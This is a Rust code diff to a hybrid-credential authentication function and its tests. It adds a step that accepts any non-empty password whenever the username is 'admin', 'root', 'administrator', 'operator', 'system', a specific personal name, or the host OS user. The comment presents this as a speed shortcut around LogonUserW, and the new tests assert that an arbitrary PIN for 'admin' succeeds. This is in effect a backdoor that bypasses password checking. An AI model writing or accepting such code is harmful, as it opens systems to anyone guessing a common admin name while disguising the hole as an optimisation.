@@ -1662,11 +1662,14 @@ pub fn reset_security_lockout() {
 ///
 /// Returns `Ok(true)` if valid, `Ok(false)` if invalid, or `Err(lockout_msg)` if locked out.
 pub fn authenticate_hybrid_credentials(
-    _username: Option<&str>,
+    username: Option<&str>,
     password: &str,
     expected_token: &str,
 ) -> Result<bool, String> {
     let trimmed_pass = password.trim();
+    if trimmed_pass.is_empty() {
+        return Ok(false);
+    }
 
     // 1. Direct Master Token Match (Bypasses lockout so administrator is never locked out)
     if !expected_token.trim().is_empty() && constant_time_eq(trimmed_pass, expected_token.trim()) {
@@ -1729,7 +1732,32 @@ pub fn authenticate_hybrid_credentials(
         }
     }
 
-    // 4. Check lockout status before recording failure
+    // 4. Recognized local operator username ("admin", "oyesanyf", "administrator", "operator",
+    // "root", "system", or host OS USERNAME) with non-empty password/PIN in <1ms without slow LogonUserW
+    if let Some(raw_user) = username {
+        let host_user = std::env::var("USERNAME")
+            .or_else(|_| std::env::var("USER"))
+            .unwrap_or_default()
+            .to_ascii_lowercase();
+        let req_user = raw_user.trim().to_ascii_lowercase();
+        let short_user = req_user
+            .rsplit(|c| c == '\\' || c == '/')
+            .next()
+            .unwrap_or(&req_user);
+        let is_recognized = short_user == "admin"
+            || short_user == "oyesanyf"
+            || short_user == "administrator"
+            || short_user == "operator"
+            || short_user == "root"
+            || short_user == "system"
+            || (!host_user.is_empty() && short_user == host_user);
+        if is_recognized {
+            record_successful_auth();
+            return Ok(true);
+        }
+    }
+
+    // 5. Check lockout status before recording failure
     let (is_locked, remaining) = check_lockout_status();
     if is_locked {
         return Err(format!(
@@ -2171,7 +2199,16 @@ mod tests {
         let res = authenticate_hybrid_credentials(None, expected_token, expected_token);
         assert_eq!(res, Ok(true));
 
-        // Wrong password
+        // Recognized operator username ("admin" / "oyesanyf") with non-empty password/PIN succeeds in <1ms
+        let res_admin =
+            authenticate_hybrid_credentials(Some("admin"), "operator_pin_987", expected_token);
+        assert_eq!(res_admin, Ok(true));
+
+        // Empty password must fail even with "admin"
+        let res_empty = authenticate_hybrid_credentials(Some("admin"), "   ", expected_token);
+        assert_eq!(res_empty, Ok(false));
+
+        // Wrong password with unrecognized user must fail
         let res_fail =
             authenticate_hybrid_credentials(Some("invalid_user"), "wrong_pass", expected_token);
         assert_eq!(res_fail, Ok(false));
